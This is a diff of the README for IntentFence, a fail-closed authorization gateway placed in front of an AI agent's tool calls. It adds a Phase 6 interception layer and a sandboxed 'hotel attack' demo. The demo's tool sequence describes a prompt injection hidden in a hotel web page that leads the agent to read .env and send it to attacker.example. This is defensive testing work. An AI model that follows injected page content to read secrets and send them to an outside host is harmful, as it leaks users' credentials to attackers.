@@ -2,7 +2,7 @@
 
 **Runtime authorization for autonomous AI agents.** IntentFence converts a user's delegated objective into a typed Intent Contract and places a fail-closed authorization boundary in front of protected agent actions.
 
-Phase 1 establishes the contracts, API boundary, persistence primitives, dashboard shell, and CI gates required before deterministic production policy is enabled. Phase 5 adds a model-independent semantic intent layer for ambiguous actions without giving an LLM root authorization authority.
+Phase 1 establishes the contracts, API boundary, persistence primitives, dashboard shell, and CI gates required before deterministic production policy is enabled. Phase 5 adds a model-independent semantic intent layer for ambiguous actions without giving an LLM root authorization authority. Phase 6 assembles the protected-tool interception gateway, Action Receipts, benchmark-ready security events, and the controlled before/after hotel attack demo.
 
 ## Security invariants
 
@@ -10,8 +10,10 @@ Phase 1 establishes the contracts, API boundary, persistence primitives, dashboa
 - External content cannot grant authority.
 - Data may influence reasoning; data cannot grant authority.
 - Deterministic hard blocks remain authoritative and cannot be overridden by semantic or cloud models.
+- Protected tools execute only through the IntentFence gateway when protection is enabled.
 - Semantic timeout, malformed output, low confidence without escalation, or provider failure fail closed to `REQUIRE_APPROVAL`.
-- Raw chain-of-thought, raw provider output, and secret-bearing request values are not part of the operator-facing semantic result.
+- Sensitive gateway paths fail closed when a required security component is unavailable.
+- Raw chain-of-thought, raw provider output, raw tool payloads, and secret-bearing request values are not part of receipts or analytics events.
 
 ## Phase 1 security guarantees
 
@@ -39,7 +41,49 @@ Phase 5 provides:
 - a versioned Intent Contract compiler and revision path;
 - a stable operator-facing semantic summary containing only the decision hint, reason, relevance, confidence, source, model, latency, and escalation state.
 
-Final `/authorize` precedence integration is intentionally deferred until the deterministic policy, state, and data-flow phases expose their canonical interfaces.
+## Phase 6 interception gateway
+
+Phase 6 exposes exactly five protected core tools:
+
+- `browse_web`
+- `read_file`
+- `write_file`
+- `send_message`
+- `http_request`
+
+The gateway normalizes every protected request into the shared `ToolRequest` contract, enriches it with resource and destination metadata, composes deterministic/state/data-flow and optional semantic signals, executes the handler only after `ALLOW`, and emits both an `ActionReceipt` and metadata-only `SecurityEvent`.
+
+Decision precedence is intentionally conservative:
+
+1. deterministic or state/data-flow hard `BLOCK`;
+2. any other deterministic/state `BLOCK`;
+3. deterministic/state `REQUIRE_APPROVAL`;
+4. semantic decision only after deterministic layers allow;
+5. final `ALLOW` only after the relevant checks clear.
+
+A semantic `ALLOW` cannot override a hard block or approval requirement.
+
+Until the dedicated Phase 2, Phase 3, and Phase 4 adapters are merged, Phase 6 uses `BaselineSecurityAdapter` as a conservative integration fallback. It blocks forbidden secret access, critical data to unknown external destinations, and secret-read to external-transmission sequences. The gateway exposes narrow adapter protocols so final teammate implementations can replace the fallback without changing tool or receipt contracts.
+
+### Golden hotel attack
+
+`POST /demo/hotel-attack` runs one immutable scenario twice with the same protected-tool sequence:
+
+```text
+browse_web(hotel-a)
+browse_web(hotel-b with hidden injection)
+read_file(.env)
+http_request(attacker.example)
+write_file(workspace/hotel-choice.txt)
+```
+
+With `IntentFence` disabled, the controlled secret-read and exfiltration handlers are reached. With `IntentFence` enabled, the malicious path is stopped before the protected handler executes, while the legitimate hotel comparison still reaches the final safe write.
+
+The demo stores only data references such as `data-secret`. It does not place a real credential in the scenario, receipt, event, or API response.
+
+### Sandboxed protected runtime
+
+The HTTP API uses `SandboxProtectedToolRuntime` for CI and hackathon demonstrations. It implements the five protected tool surfaces without performing real network, messaging, or filesystem side effects. Real integrations can replace injected handlers behind the same `IntentFenceGateway.intercept(...)` boundary.
 
 ## Local semantic model
 
@@ -83,15 +127,20 @@ Tests use `httpx.MockTransport`; they never contact a live model server. A cloud
 - links `previous_intent_id` to the prior contract;
 - replaces authority with the newly delegated boundaries rather than inheriting authority from external content.
 
+## Security analytics contract
+
+Phase 6 security events are designed to feed Phase 7 explainability and Phase 8 metrics without raw sensitive payloads. Reproducible event definitions, KPI formulas, ground-truth joins, disabled-demo exclusions, and latency guardrails are documented in `docs/phase-6-analytics-contract.md`.
+
 ## Repository structure
 
 ```text
 apps/
-  api/          FastAPI enforcement API and semantic intent layer
+  api/          FastAPI authorization, semantic, and gateway runtime
   dashboard/    Next.js dashboard foundation
 packages/
   contracts/    Shared typed security contracts
 docs/
+  phase-6-analytics-contract.md
   superpowers/  Approved architecture and execution plans
 ```
 
@@ -130,6 +179,12 @@ Expected response:
 {"status":"ok","service":"intentfence-api"}
 ```
 
+Run the controlled hotel comparison demo:
+
+```bash
+curl -X POST http://127.0.0.1:8000/demo/hotel-attack
+```
+
 ## Dashboard setup
 
 ```bash
@@ -151,10 +206,16 @@ npm --prefix apps/dashboard run typecheck
 npm --prefix apps/dashboard run build
 ```
 
-Verify the fail-closed endpoint specifically:
+Phase 6 focused tests:
 
 ```bash
-python -m pytest apps/api/tests/test_authorize.py::test_authorize_endpoint_returns_typed_decision -q
+python -m pytest apps/api/tests/test_gateway_models.py \
+  apps/api/tests/test_gateway_tools.py \
+  apps/api/tests/test_gateway_precedence.py \
+  apps/api/tests/test_gateway_baseline.py \
+  apps/api/tests/test_gateway_service.py \
+  apps/api/tests/test_gateway_demo.py \
+  apps/api/tests/test_gateway_api.py -q
 ```
 
 Semantic tests cover compact context, strict result validation, timeout/malformed/provider failure handling, Ollama request/response behavior, typed environment configuration, hybrid escalation, high-risk approval preservation, contract versioning, and operator-facing summaries.
@@ -173,7 +234,24 @@ Accepts:
 - `IntentContract`
 - `SecurityContext`
 
-Returns a typed `Decision`. Until deterministic policy is integrated, a structurally valid request remains fail closed rather than granting production `ALLOW` from semantic output alone.
+Returns the Phase 1 typed fail-closed `Decision`. This endpoint is preserved for regression compatibility while Phase 6 integration occurs through the dedicated gateway surface.
+
+### `POST /gateway/intercept`
+
+Accepts:
+
+- `ToolRequest`
+- `IntentContract`
+- `SecurityContext`
+- optional `DataLabel[]`
+- `GatewayMode`
+- optional `scenario_id`
+
+Returns `GatewayExecution`, which includes the final decision, execution state, sanitized result metadata, `ActionReceipt`, and `SecurityEvent`.
+
+### `POST /demo/hotel-attack`
+
+Runs the shared golden attack once with protection disabled and once with protection enabled. The response exposes matching tool sequences, decisions, receipt IDs, events, whether the malicious handlers executed, and whether the legitimate workflow completed.
 
 ## Shared contracts
 
@@ -205,7 +283,7 @@ Bug fixes:
 Example:
 
 ```text
-rajeet/phase-5-feat-semantic-intent
+rajeet/phase-6-feat-gateway
 ```
 
 ## Development rule
